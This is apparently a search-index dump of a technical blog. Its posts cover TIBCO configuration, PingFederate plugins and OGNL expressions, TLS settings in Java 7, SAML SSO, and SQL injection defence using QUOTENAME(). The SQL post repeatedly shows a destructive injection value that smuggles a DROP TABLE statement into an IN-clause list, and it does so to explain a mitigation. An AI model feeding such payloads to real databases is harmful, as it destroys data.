Test connection failure issue even with the latest version of BusinessEvents (At this point I have version 5.1), follow the below steps :- 1) Copy the following jar files to the below location :- jar files :- jms.jar tibjms.jar Location where the JAR files need to be copied:- %BE_HOME%/be/5.1/lib/ext/tpcl Note - In my BE installation, I didn't find the above jar files, I copied them from other TIBCO products installation folders. 2) Set the path in the studio.tra file :- location of the Studio.tra file :- %BE_HOME%\\be\\5.1\\studio\\eclipse\\configuration\\Studio.tra Where the path needs to set:- Look for the \"studio.extended.classpath\" in the studio.tra file and set the path for the jar files after the existing paths. Something like this (added line is highlighted in bold) :- studio.extended.classpath=%BE_HOME%/hotfix/lib/ext/tpcl;%BE_HOME%/lib/ext/tpcl;%AS_HOME%/lib; %HAWK_HOME%/lib ; %BE_HOME%/be/5.1/lib/ext/tpcl/jms.jar;%BE_HOME%/be/5.1/lib/ext/tpcl/tibjms.jar","title":"TIBCO BusinessEvents 5.1 Studio&ndash; JMS Test connection failed"},{"location":"2014/04/2014-04-11-tibco-businessworks-6-0-release-announcement/","text":"Details here - http://www.tibco.com/company/news/releases/2014/press1337.jsp AN upcoming webinar which you can register - http://forms2.tibco.com/webinar-amx-bw6-q314.html?utm_medium=pr&utm_term=bw6pagepr&utm_content=textlink&utm_campaign=bw6apr14 It will use Eclipse IDE \u2013 this means more seamless usage of TFS via the eclipse-TFS plug in . It is a relief as I am not a big fan of the TFS integration capabilities of TIBCO BW Designer at this point.","title":"TIBCO BusinessWorks 6.0 release announcement"},{"location":"2014/05/2014-05-05-sql-injection-dynamic-sql-with-in-clause-and-quotename/","text":"Use case The application gets a list of comma separated account codes which need to be looked up in an Account table using the IN clause in a dynamic query . The application can not use prepared statements or stored procedures. The objective is to minimize the risk of SQL injection. In this post we will discuss potential SQL injection using dynamic SQL and using an SQL server inbuilt function named QUOTENAME() to minimize the risk of SQL injection. Setting up Account table and sample data SET ANSI_NULLS ON GO SET QUOTED_IDENTIFIER ON GO SET ANSI_PADDING ON GO IF OBJECT_ID('Account') IS NOT NULL BEGIN DROP TABLE Account END GO CREATE TABLE [dbo].[Account]( [Id] [int] IDENTITY(1,1) NOT NULL, [AccountCode] [varchar](50) NULL, [AccountName] [nvarchar](200) NULL, CONSTRAINT [PK_Account] PRIMARY KEY CLUSTERED ( [Id] ASC ) ) GO SET ANSI_PADDING OFF GO SET IDENTITY_INSERT [dbo].[Account] ON INSERT [dbo].[Account] ([Id], [AccountCode], [AccountName]) VALUES (1, N'XOD814', N'Test account1') INSERT [dbo].[Account] ([Id], [AccountCode], [AccountName]) VALUES (2, N'GUR78437', N'Test account2') INSERT [dbo].[Account] ([Id], [AccountCode], [AccountName]) VALUES (3, N'TIY5', N'Test account3') INSERT [dbo].[Account] ([Id], [AccountCode], [AccountName]) VALUES (4, N'KOS370', N'Test account4') SET IDENTITY_INSERT [dbo].[Account] OFF After setup the Accounts looks like below :- Input data - 'XOD814,GUR78437,ABCD'); DROP TABLE Account; \u2013' There are three items in the list which we want to look for in our table using the IN clause :- XOD814 GUR78437 ABCD'); DROP TABLE Account; \u2013 As you can imagine, It\u2019s the third item which might cause the table to be dropped. Let us see how :- DECLARE @Query NVARCHAR(max) SET @Query = 'SELECT * FROM Account WHERE AccountCode IN (''XOD814'',''GUR78437'', ''ABCD''); DROP TABLE Account; --'')' SELECT @Query AS 'Executed query' EXEC (@Query ) IF OBJECT_ID ('Account') IS NOT NULL BEGIN SELECT 'Account table exists' END ELSE BEGIN SELECT 'Account table got dropped.' END GO If you zoom in to the highlighted statement above :- A \u2013 The actual value \u2018ABCD\u2019 is terminated by a single quote (which is escaped here in order to make it a proper SQL statement) and then with a ending bracket and a semicolon making the end of the select statement. The subsequent drop statement become now a qualified correct statement to be executed. B \u2013 The DROP TABLE statement is now terminated by a semicolon followed by double dashes commenting out any possible subsequent statements which might get added by dynamic SQL formation. Executing the above Sql script would get the table stopped because of the below resulting query Resulting SQL query SELECT * FROM Account WHERE AccountCode IN ('XOD814','GUR78437','ABCD'); DROP TABLE Account; --') NOTE: '); closes the original statement and then a second statement (drop table) follows. QUOTENAME() Function QUOTENAME() function on a value delimits the value with a character (for example - a single quote) which can also be specified in the function. So, even if the value contains some other characters like quotes or semicolons to inject harmful SQL statements, the value is delimited and those harmful SQL statements will now become part of the string to be searched in the table rather than valid SQL statements to be executed and causing harm! Below is the same query with all the values enclosed in QUOTENAME() with a single quote as delimiter. So, the client application can split the list of values and enclose each value in QUOTENAME() function before sending the dynamic SQL to SQL server. DECLARE @Query NVARCHAR(max) SET @Query = 'SELECT * FROM Account WHERE AccountCode IN ('+QUOTENAME('XOD814','''')+','+QUOTENAME('GUR78437','''')+','+QUOTENAME('ABCD''); DROP TABLE Account; --','''')+')' SELECT @Query AS 'Executed query' EXEC(@Query) IF OBJECT_ID ('Account') IS NOT NULL BEGIN SELECT 'Account table exists' END ELSE BEGIN SELECT 'Account table got dropped.' END GO Resulting SQL Query SELECT * FROM Account WHERE AccountCode IN ('XOD814','GUR78437','ABCD''); DROP TABLE Account; --') NOTE - ''); can not close the original statement because the single quote is escaped. Difference when using QUOTENAME() So \u2013 what is the difference? Its just a single quote \u2013 highlighted in red below. QUOTENAME() delimits the whole 'ABCD ' ); DROP TABLE Account; \u2013' with single quotes and in that process escapes the single quote right after ABCD which would have otherwise terminated the string to ABCD which would be then terminated by ); followed by execution of DROP TABLE. Executed Query without QUOTENAME() SELECT * FROM Account WHERE AccountCode IN ('XOD814','GUR78437','ABCD'); DROP TABLE Account; --') NOTE: '); closes the original statement and then a second statement (drop table) follows. Executed Query with QUOTENAME() SELECT * FROM Account WHERE AccountCode IN ('XOD814','GUR78437','ABCD''); DROP TABLE Account; --') NOTE - ''); can not close the original statement because the single quote is escaped.","title":"Minimizing SQL Injection - Dynamic SQL with IN Clause and QUOTENAME()"},{"location":"2014/05/2014-05-05-sql-injection-dynamic-sql-with-in-clause-and-quotename/#use-case","text":"The application gets a list of comma separated account codes which need to be looked up in an Account table using the IN clause in a dynamic query . The application can not use prepared statements or stored procedures. The objective is to minimize the risk of SQL injection. In this post we will discuss potential SQL injection using dynamic SQL and using an SQL server inbuilt function named QUOTENAME() to minimize the risk of SQL injection.","title":"Use case"},{"location":"2014/05/2014-05-05-sql-injection-dynamic-sql-with-in-clause-and-quotename/#setting-up-account-table-and-sample-data","text":"SET ANSI_NULLS ON GO SET QUOTED_IDENTIFIER ON GO SET ANSI_PADDING ON GO IF OBJECT_ID('Account') IS NOT NULL BEGIN DROP TABLE Account END GO CREATE TABLE [dbo].[Account]( [Id] [int] IDENTITY(1,1) NOT NULL, [AccountCode] [varchar](50) NULL, [AccountName] [nvarchar](200) NULL, CONSTRAINT [PK_Account] PRIMARY KEY CLUSTERED ( [Id] ASC ) ) GO SET ANSI_PADDING OFF GO SET IDENTITY_INSERT [dbo].[Account] ON INSERT [dbo].[Account] ([Id], [AccountCode], [AccountName]) VALUES (1, N'XOD814', N'Test account1') INSERT [dbo].[Account] ([Id], [AccountCode], [AccountName]) VALUES (2, N'GUR78437', N'Test account2') INSERT [dbo].[Account] ([Id], [AccountCode], [AccountName]) VALUES (3, N'TIY5', N'Test account3') INSERT [dbo].[Account] ([Id], [AccountCode], [AccountName]) VALUES (4, N'KOS370', N'Test account4') SET IDENTITY_INSERT [dbo].[Account] OFF After setup the Accounts looks like below :- Input data - 'XOD814,GUR78437,ABCD'); DROP TABLE Account; \u2013' There are three items in the list which we want to look for in our table using the IN clause :- XOD814 GUR78437 ABCD'); DROP TABLE Account; \u2013 As you can imagine, It\u2019s the third item which might cause the table to be dropped. Let us see how :- DECLARE @Query NVARCHAR(max) SET @Query = 'SELECT * FROM Account WHERE AccountCode IN (''XOD814'',''GUR78437'', ''ABCD''); DROP TABLE Account; --'')' SELECT @Query AS 'Executed query' EXEC (@Query ) IF OBJECT_ID ('Account') IS NOT NULL BEGIN SELECT 'Account table exists' END ELSE BEGIN SELECT 'Account table got dropped.' END GO If you zoom in to the highlighted statement above :- A \u2013 The actual value \u2018ABCD\u2019 is terminated by a single quote (which is escaped here in order to make it a proper SQL statement) and then with a ending bracket and a semicolon making the end of the select statement. The subsequent drop statement become now a qualified correct statement to be executed. B \u2013 The DROP TABLE statement is now terminated by a semicolon followed by double dashes commenting out any possible subsequent statements which might get added by dynamic SQL formation. Executing the above Sql script would get the table stopped because of the below resulting query Resulting SQL query SELECT * FROM Account WHERE AccountCode IN ('XOD814','GUR78437','ABCD'); DROP TABLE Account; --') NOTE: '); closes the original statement and then a second statement (drop table) follows.","title":"Setting up Account table and sample data"},{"location":"2014/05/2014-05-05-sql-injection-dynamic-sql-with-in-clause-and-quotename/#_1","text":"QUOTENAME() Function QUOTENAME() function on a value delimits the value with a character (for example - a single quote) which can also be specified in the function. So, even if the value contains some other characters like quotes or semicolons to inject harmful SQL statements, the value is delimited and those harmful SQL statements will now become part of the string to be searched in the table rather than valid SQL statements to be executed and causing harm! Below is the same query with all the values enclosed in QUOTENAME() with a single quote as delimiter. So, the client application can split the list of values and enclose each value in QUOTENAME() function before sending the dynamic SQL to SQL server. DECLARE @Query NVARCHAR(max) SET @Query = 'SELECT * FROM Account WHERE AccountCode IN ('+QUOTENAME('XOD814','''')+','+QUOTENAME('GUR78437','''')+','+QUOTENAME('ABCD''); DROP TABLE Account; --','''')+')' SELECT @Query AS 'Executed query' EXEC(@Query) IF OBJECT_ID ('Account') IS NOT NULL BEGIN SELECT 'Account table exists' END ELSE BEGIN SELECT 'Account table got dropped.' END GO Resulting SQL Query SELECT * FROM Account WHERE AccountCode IN ('XOD814','GUR78437','ABCD''); DROP TABLE Account; --') NOTE - ''); can not close the original statement because the single quote is escaped.","title":""},{"location":"2014/05/2014-05-05-sql-injection-dynamic-sql-with-in-clause-and-quotename/#difference-when-using-quotename","text":"So \u2013 what is the difference? Its just a single quote \u2013 highlighted in red below. QUOTENAME() delimits the whole 'ABCD ' ); DROP TABLE Account; \u2013' with single quotes and in that process escapes the single quote right after ABCD which would have otherwise terminated the string to ABCD which would be then terminated by ); followed by execution of DROP TABLE. Executed Query without QUOTENAME() SELECT * FROM Account WHERE AccountCode IN ('XOD814','GUR78437','ABCD'); DROP TABLE Account; --') NOTE: '); closes the original statement and then a second statement (drop table) follows. Executed Query with QUOTENAME() SELECT * FROM Account WHERE AccountCode IN ('XOD814','GUR78437','ABCD''); DROP TABLE Account; --') NOTE - ''); can not close the original statement because the single quote is escaped.","title":"Difference when using QUOTENAME()"},{"location":"2015/09/2015-09-07-developing-and-configuring-a-custom-password-credential-validator-pcv-for-pingfederate/","text":"This post provides a step-by-step instructions on developing and configuring a custom password credential validator [PCV] for PingFederate using PingFederate SDK. If you are using PingFederate in your enterprise, you would probably use an authentication service from PingFederate to authenticate your users. This sample example of custom PCV, demonstrates how to create the UI element in your PingFederate to configure your custom service URL and how the can you use the same service URL to authenticate the users. I am using NetBeans IDE 8.0.2. However, you can use this same concept from Eclipse as well. The source code for this project is available in the below GitHub repository. https://github.com/ashishmgupta/pingfederate-idp-pcv-authenticate Open Netbeans. Go to File > New > Java Class Library Click Next Type a name for the project. I chose \u201cpingfederate-idp-pcv-authenticate\u201d The created file view [Window > Files ] for the project will look like below In order to use and compile the project with the PingFederate SDK, locate the pf-protocolengine.jar in the local pingefederate installation folder [\\pingfederate\\server\\default\\lib]. copy the to the lib folder in the projects file view which will now look like below. Go to the Project view of the project [Window > Projects] The reference to the pf-protocolengine.jar is now added. Go to the File view and right click on the scr folder > Java Class > Enter the class name as \u201cpingfederate.passwordcredentialvalidators.Authenticator\u201d and click Finished. This created the below file Extend the class from the PasswordCredentialsValidator. You do need to import few namespaces. Below is the complete class. [sourcecode language='java' ] package pingfederate.passwordcredentialvalidators; import com.pingidentity.sdk.GuiConfigDescriptor; import com.pingidentity.sdk.PluginDescriptor; import com.pingidentity.sdk.password.PasswordCredentialValidator; import com.pingidentity.sdk.password.PasswordCredentialValidatorAuthnException; import com.pingidentity.sdk.password.PasswordValidationException; import java.util.Collections; import org.sourceid.saml20.adapter.attribute.AttributeValue; import org.sourceid.saml20.adapter.conf.Configuration; import org.sourceid.saml20.adapter.gui.TextFieldDescriptor; import org.sourceid.util.log.AttributeMap; /** * * @author Ashish Gupta */ public class Authenticator implements PasswordCredentialValidator{ private static final String authServiceURLLabel = \"Authentication service URL\"; private static final String authServiceURLDescription = \"The URL of the service which validates user's credentials\"; private static final String USERNAME = \"username\"; private String authenticationURL = \"\"; /\\*Creates a textfield for the authentication service URL in the Admin UI \\*/ @Override public PluginDescriptor getPluginDescriptor() { GuiConfigDescriptor guiDescriptor = new GuiConfigDescriptor(); TextFieldDescriptor authServiceURLTextField = new TextFieldDescriptor (authServiceURLLabel, authServiceURLDescription); guiDescriptor.addField(authServiceURLTextField); PluginDescriptor pluginDescriptor = new PluginDescriptor (buildName(), this, guiDescriptor); /\\* Below will make the attributes available in the input Userid mapping in the composite adapter If this is used inside the composite adapter.\\*/ pluginDescriptor.setAttributeContractSet(Collections.singleton(USERNAME)); return pluginDescriptor; } /\\* Get all the configured values in the PingFed admin e.g. Service URL \\*/ @Override public void configure(Configuration configuration) { this.authenticationURL = configuration.getFieldValue(authServiceURLLabel); } @Override public AttributeMap processPasswordCredential (String userName, String password) throws PasswordValidationException { AttributeMap attributeMap = new AttributeMap(); if(!AuthHelper.IsUserAuthenticated(this.authenticationURL, userName, password)) { throw new PasswordCredentialValidatorAuthnException (false, \"authn.srvr.msg.invalid.credentials\"); } else { /\\* The username value put here will be avilable to the next adapter in the composite adapter chain\\*/ attributeMap.put(USERNAME, new AttributeValue(userName)); } return attributeMap; } private String buildName() { return \"Custom password credential validator\"; /\\* Package plugin = Authenticator.class.getPackage(); return plugin.getImplementationTitle();//+ \" \" + plugin.getImplementationVersion(); \\*/ } } [/sourcecode] Focus on the below methods in the /Authenticator.java:- getPluginDescriptor() This can be used to configure any set of UI elements which needs to be configured by the PingFed administrator. In this example, It creates a textfield for the authentication service URL in the Admin UI. This is where the PingFederate administrator would configure the service URL. configure(Configuration configuration) This can be used to get the configured values from the UI elements (set thie getPluginDescriptor) to the class level variables which then can be used in the processPasswordCredential() method [described below]. processPasswordCredential(String userName, String password) Takes the username and password from the input fields in the HTML form and authenticates the user with your service. Ignore the implementation details of the service. If the authentication service does not allow the service, this method should throw the PasswordCredentialValidatorAuthnException with \"false\" and a string which shows up to the user in the HTML login form as an error message. One more thing \u2013 You do have to identify this project as a password credential validator. For this \u2013 add a folder named PF-INF under src and name it \u201cpassword-credential-validators\u201d. Put the fully qualified name of the class, in this case \u2013 pingfederate.passwordcredentialvalidators.Authenticator . Build the project and by default the jar file would be created under /dist folder. However, you can change the default location by changing the \u201cdist.dir\u201d property in the nbproject/project.properties file. Now we have developed and deployed the custom PCV, Its time to configure the same in the PingFederate admin console. Configuring the custom PCV in PingFederate Admin console Go to Server Configuration > Authentication > Password Credential Validators Click \u201cCreate New Instance\u201d You can see the Type of the PCV in the type dropdown. Note that the text shown as the type here is controlled by the name you provide in the below class instantiation in the getPluginDescriptor method as described above. PluginDescriptor pluginDescriptor = new PluginDescriptor (\u201cCustom Password Credential Validator\u201d, this, guiDescriptor); Provide a name and instance id as well and click Next. Provide the service URL and click Next. Notice the core contract attribute is _username. _This is the attribute we set in the processPasswordCredential(). If the user is authenticated, we put the user name in this same attribute so that It is available for the next adapter in the composite adapter chain If this PCV is used in a composite adapter. attributeMap.put(username, new AttributeValue(userName)); Click Next and Done and then Below screen shows the summary. Click Done in this screen. Click Save in the below screen. You have successfully developed, deployed and configured a password credential validator in PingFederate. In the forthcoming articles we will see how we can use this PCV in a adapter and set up the adapter for user authentication via HTML form.","title":"Developing and configuring a custom password credential validator [PCV] for PingFederate"},{"location":"2015/09/2015-09-07-developing-and-configuring-a-custom-password-credential-validator-pcv-for-pingfederate/#configuring-the-custom-pcv-in-pingfederate-admin-console","text":"Go to Server Configuration > Authentication > Password Credential Validators Click \u201cCreate New Instance\u201d You can see the Type of the PCV in the type dropdown. Note that the text shown as the type here is controlled by the name you provide in the below class instantiation in the getPluginDescriptor method as described above. PluginDescriptor pluginDescriptor = new PluginDescriptor (\u201cCustom Password Credential Validator\u201d, this, guiDescriptor); Provide a name and instance id as well and click Next. Provide the service URL and click Next. Notice the core contract attribute is _username. _This is the attribute we set in the processPasswordCredential(). If the user is authenticated, we put the user name in this same attribute so that It is available for the next adapter in the composite adapter chain If this PCV is used in a composite adapter. attributeMap.put(username, new AttributeValue(userName)); Click Next and Done and then Below screen shows the summary. Click Done in this screen. Click Save in the below screen. You have successfully developed, deployed and configured a password credential validator in PingFederate. In the forthcoming articles we will see how we can use this PCV in a adapter and set up the adapter for user authentication via HTML form.","title":"Configuring the custom PCV in PingFederate Admin console"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/","text":"Scenario : You need to send a complex JSON payload in the SAML. The payload would depend upon the contextual data requested through a querystring . Below is the SP connection would look like:- https://sso.idp.com/idp/startSSO.ping?PartnerSpId=https://www.serviceprovider.com&Request_Payload={\"Param1\":\"9999\",\"Param2\":\"8787879\",\"Param3\":\"Test\"} The input context is in the querystring which is a JSON:- {\"Param1\":\"9999\",\"Param2\":\"8787879\",\"Param3\":\"Test\"} Above request JSON when passed to a service will give a JSON response like below :- \"data\": { \"level1\": \"some data\", \"level2\": \"some data11\", \"level3\": { \"level131\": \"some data 13\", \"level132\": [{ \"level1321\": { \"level13211\": { \"level132111\": \"False\", \"level132112\": \"True\" }, \"level13212\": \"some data\", \"level13213\": \"some data\" }, \"level1322\": \"some data\" }, ], \"level133\": \"test data\", \"level134\": \"test data\", } } The output needs to be included in the SAML as a value for a SAML attribute. In this case the attribute is named as \u201cPayload\u201d. When we have implemented the solution, below is the part of the SAML response what It would like showing the attribute key \u201cPayload\u201d and the value from the service. \"data\": { \"level1\": \"some data\", \"level2\": \"some data11\", \"level3\": { \"level131\": \"some data 13\", \"level132\": [{ \"level1321\": { \"level13211\": { \"level132111\": \"False\", \"level132112\": \"True\" }, \"level13212\": \"some data\", \"level13213\": \"some data\" }, \"level1322\": \"some data\" }, ], \"level133\": \"test data\", \"level134\": \"test data\", } } Now on a first thought one would think this could be done using a custom data-source in PingFederate. However, a custom data-source does not have access to the HTTP request context and therefore cannot access the querystring. One way to solve this to use an OGNL expression for the \u201cPayload\u201d attribute. The OGNL expression has access to the HttpRequest. So \u2013 not only we can get the querystring, but also can get the authentication cookies from the request which may be required by the payload service. ServiceURL=\"http://example.com/payloadservice\", //Get all the cookies cookies=#this.get(\"context.HttpRequest\").getObjectValue().getCookies(), cookiesMap=new java.util.HashMap(), cookies.{ #cookie=#this, #cookiesMap.put(#cookie.getName(),#cookie.getValue()) }, // Get the querystring querystring = #this.get(\"context.HttpRequest\").getObjectValue().getQueryString(), indexOfPayLoadKey = #querystring.indexOf(\"&Request_Payload=\"), actualPayload=#querystring.substring(#indexOfPayLoadKey), // Get the actual payload request actualPayload=#actualPayload.replace(\"&Request_Payload=\",\"\"), /* Via a service call, call the service with the payload request and get the payload response*/ restPayloadServiceHelper = new com.pingfederate.utils.payloadservices.RESTPayloadServiceHelper(#ServiceURL), restPayloadServiceHelper.GetServiceResponsePayload(#actualPayload, #cookiesMap) Below is the skeleton of the helper class the OGNL expression is using. The jar file for the class needs to be put in the \u201c\\pingfederate\\server\\default\\deploy\u201d folder and the PingFederate service needs to be restarted. /* The constructor takes the URL. The method GetServiceResponse takes the payload and also the cookie collection */ public class RESTPayloadServiceHelper { String serviceURL = \"\"; JSONObject jsonPayloadRequest = null; public RESTPayloadServiceHelper(String serviceURL) { if(serviceURL!= null || serviceURL.length() > 0) { this.serviceURL = serviceURL; } else { throw new IllegalArgumentException(\" The supplied service URL \" + serviceURL + \" is not valid\"); } } public String GetServiceResponsePayload(String adhocPayloadString, HashMap<String,String> cookieCollection) throws UnknownHostException, IOException { // Call the service and return the payload response } }","title":"PingFederate : Include a complex payload in the SAML assertion"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#serviceurlhttpexamplecompayloadservice","text":"//Get all the cookies","title":"ServiceURL=\"http://example.com/payloadservice\","},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#cookiesthisgetcontexthttprequestgetobjectvaluegetcookies","text":"","title":"cookies=#this.get(\"context.HttpRequest\").getObjectValue().getCookies(),"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#cookiesmapnew-javautilhashmap","text":"","title":"cookiesMap=new java.util.HashMap(),"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#cookies-cookiethis-cookiesmapputcookiegetnamecookiegetvalue","text":"// Get the querystring","title":"cookies.{ #cookie=#this, #cookiesMap.put(#cookie.getName(),#cookie.getValue()) },"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#querystring-thisgetcontexthttprequestgetobjectvaluegetquerystring","text":"","title":"querystring = #this.get(\"context.HttpRequest\").getObjectValue().getQueryString(),"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#indexofpayloadkey-querystringindexofrequest_payload","text":"","title":"indexOfPayLoadKey = #querystring.indexOf(\"&amp;Request_Payload=\"),"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#actualpayloadquerystringsubstringindexofpayloadkey","text":"// Get the actual payload request","title":"actualPayload=#querystring.substring(#indexOfPayLoadKey),"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#actualpayloadactualpayloadreplacerequest_payload","text":"/* Via a service call, call the service with the payload request and get the payload response*/","title":"actualPayload=#actualPayload.replace(\"&amp;Request_Payload=\",\"\"),"},{"location":"2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/#restpayloadservicehelper-new-compingfederateutilspayloadservicesrestpayloadservicehelperserviceurl","text":"restPayloadServiceHelper.GetServiceResponsePayload(#actualPayload, #cookiesMap) Below is the skeleton of the helper class the OGNL expression is using. The jar file for the class needs to be put in the \u201c\\pingfederate\\server\\default\\deploy\u201d folder and the PingFederate service needs to be restarted. /* The constructor takes the URL. The method GetServiceResponse takes the payload and also the cookie collection */ public class RESTPayloadServiceHelper { String serviceURL = \"\"; JSONObject jsonPayloadRequest = null; public RESTPayloadServiceHelper(String serviceURL) { if(serviceURL!= null || serviceURL.length() > 0) { this.serviceURL = serviceURL; } else { throw new IllegalArgumentException(\" The supplied service URL \" + serviceURL + \" is not valid\"); } } public String GetServiceResponsePayload(String adhocPayloadString, HashMap<String,String> cookieCollection) throws UnknownHostException, IOException { // Call the service and return the payload response } }","title":"restPayloadServiceHelper = new com.pingfederate.utils.payloadservices.RESTPayloadServiceHelper(#ServiceURL),"},{"location":"2016/07/2016-07-15-changing-from-tls-v1-0-to-tls-v1-2-from-a-tomcat-java-7-app/","text":"Apparently if you have a Java 7 app, and if the app connects to a HTTPS endpoint, TLS 1.0 is used by default with a weak cipher suite ECDHE-RSA-DES-CBC3-SHA. Interestingly, Java 7 does support TLS 1.2 but not enabled by default. So now, If the company managing the HTTPS endpoint decide to disable TLS 1.0 for better security, the client java7 app wont be able to connect to it, because It will use TLS v1.0. Fortunately, there is a very simple way to make a change from TLS v1.0 to v1.2. Changes below are for a Windows 2012 Tomcat hosted Java 7 app. 1) Stop the Tomcat windows service. 2) Open Tomcat configuration panel (should be listed as \u201cConfigure Tomcat\u201d in the start menu). 3) Go to Java tab > Java Options > Add the below lines at the end (screenshot below). Note you may add as many as ciphers as supported by the HTTPS endpoint you are connecting to. -Dhttps.protocols=TLSv1.2 -Dhttps.cipherSuites=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 4) Start the Tomcat windows service. By the way, there are a number of supported cipher suites by Java 7 on TLS v1.2. http://docs.oracle.com/javase/7/docs/technotes/guides/security/SunProviders.html#SunJSSEProvider The supported ciphers can be added as a comma separated list in the cipher suites options. Dhttps.cipherSuites=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256","title":"Changing from TLS v1.0 to TLS v1.2 from a Tomcat Java 7 app"},{"location":"2016/08/2016-08-15-sp-initiated-single-sign-on-using-saml-2-0architecture-and-a-simple-implementation-2/","text":"Identity Provider (idP) : Party which authenticates the user Service Provider(SP/RP) : Party which provide a resource/service to the user. Also called a relying party. Below are the high level steps and I will expand on them later in this article :- User tries to access a resource on the SP website SP saves the requested resource URL, sees there user does not have a session with them. It then sends the user (with a SAMLRequest) back to the idP it trusts to authenticate. idP checks if the user has a session with them and If not challenges the user to log in. Upon successful login, idP sends the user to the SP with a SAML assertion. SP verifies the SAML assertion, creates a session for the user and lets the user access the resource. [Click on the below image to enlarge] 1. User tries to access a resource on the SP website This step is simple. User access a link on the SP. GET http://serviceprovider.com/serviceproviderweb/Folder1/Folder2/Folder3/DeeplyPlacedFile.asp?id=1 HTTP/1.1 Typically each SP website page user accesses directly (e.g. DeeplyPlacedFile.asp) would check If user has an existing session (e.g. has the required valid SP auth cookie), It will let us user stay in the page the SSO flow ends here. If the user does not have an active session next steps (starting from 2) ) below will follow. Typically, SP website have cookie check in each page via shared lib. In the example below Its an ASP include file which can be used in all the ASP pages within the SP website. Note the line :- Response.Redirect \" https://federationengine.serviceprovider.com/sp/startSSO.ping?partnerIdpId=https://federationengine.identityprovider.com&TargetResource=\"&url The above line indicates there is an PingFederate idP connection (with the name \u2018https://federationengine.identityprovider.com\u2019) on the service provider federation engine. This will create a AuthNRequest (SAMLRequest) and will port to the SSO URL on the idp side. Also note that the the requested Url is also tagged along with the TargetResource querystring. This will make sure the idP Connection would create a relaystate token and will map the same to the requested URL. (more details on this later) <% Dim protocol Dim domainName Dim fileName Dim queryString Dim url protocol = \"http\" If lcase(request.ServerVariables(\"HTTPS\"))<> \"off\" Then protocol = \"https\" End If domainName= Request.ServerVariables(\"SERVER_NAME\") fileName= Request.ServerVariables(\"SCRIPT_NAME\") queryString= Request.ServerVariables(\"QUERY_STRING\") url = protocol & \"://\" & domainName & fileName & \"?\" & queryString cookieValue = Request.Cookies(\"ServiceProviderAuthCookie\") if len(cookieValue) < 1 Then Response.Redirect \" https://federationengine.serviceprovider.com/sp/startSSO.ping?partnerIdpId=https://federationengine.identityprovider.com&TargetResource=\"&url end if %> 2. SP asks the idP to authenticate the user If the SP\u2019s federation server determines there is no active session for the user and user is coming for the first time, the federation server constructs an SAML Authentication request also called \u201cSAMLRequest\u201d and sends the base64 version of it to the idP federation server SSO URL. It also creates an identifier (as a RelayState), saves along with the originally requested URL as a key-value pair. This is done so that when the idP comes with the same identifier, It can retrieve the originally requested URL and can just redirect the user. This way, there is no need of passing the URL around. If the authentication request is sent via POST, there are the SAMLRequest and RelayState are sent in hidden fields, SAMLRequest : PHNhbWxwOkF1dGhuUmVxdWVzdCBWZXJzaW9uPSIyLjAiIElEPSJXcWhtdmZVUDQwOXl6 Sm10cGxDbjdSUkVOX3oiIElzc3VlSW5zdGFudD0iMjAxNi0wMy0wNFQwMTowNjoyNy44MDhaIiB4bWxuczpzY W1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48c2FtbDpJc3N1ZXIgeG1sbnM6c2Ft bD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+c2FtbDIwLmxwbC5jb208L3NhbWw6SXN zdWVyPjxzYW1scDpOYW1lSURQb2xpY3kgQWxsb3dDcmVhdGU9InRydWUiLz48L3NhbWxwOkF1dGhuUmVxdWVzdD4= RelayState : FMCbXM9vrgFI0jT5ZvqC4hieR3JVT4 Below is the Xml representation of the SAMLRequest :- ID=\"WqhmvfUP409yzJmtplCn7RREN\\_z\" IssueInstant=\"2016-03-04T01:06:27.808Z\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"> www.serviceprovider.com Notice the highlighted issuer id. This is the entityid of the service provider. This is needed by the identity provider to determine which party It needs to issue the SAMLResponse to. 3. idP checks if the user has a session with them and If not challenges the user to log in idP Federation server, upon getting the authentication request, initializes the appropriate connection configuration for the service provider (identified by the SP issuer id sent in the previous step). The configured authentication adapter in teh connection is invoked and user is challenged. 4. idP sends SAML assertion to the SP Federation engine Upon successful user login, the server issues the SAMLResponse. This SAMLResponse is signed with the idP\u2019s private certificate and other attributes needed for the SP to create the session for the user. If the authentication request is sent via POST, there are the SAMLRequest and RelayState are sent in hidden fields. Notice, Its the RelayState hidden field has the same value SP passed to the idp in step 2). SAMLResponse : PHNhbWxwOlJlc3BvbnNlIFZlcnNpb249IjIuMCIgSUQ9IldJcHlvTnVrRkdZQ3Q3b0FuQ1JnOHpFUG9V QiIgSXNzdWVJbnN0YW50PSIyMDE2LTAzLTA0VDAxOjA2OjE2LjczOFoiIEluUmVzcG9uc2VUbz0iV3FobXZ mVVA0MDl5ekptdHBsQ243UlJFTl96IiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6M RelayState : FMCbXM9vrgFI0jT5ZvqC4hieR3JVT4 XML respresentation of SAMLResponse below :- Key points here are :- a) The issuer id \u201cwww.identityprovider.com\u201d is the identity provider\u2019s entity id. b) The SAML is issued to the entity id \u201cwww.serviceprovider.com\u201d of the service provider. c) SAML is posted to the Assertion Consumer Service (ACS) URL https://www.serviceprovider.com/sp/ACS.saml2 of the service provider. <samlp:Response Version=\"2.0\" ID=\"WIpyoNukFGYCt7oAnCRg8zEPoUB\" IssueInstant=\"2016-03-04T01:06:16.738Z\" InResponseTo=\"WqhmvfUP409yzJmtplCn7RREN_z\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" 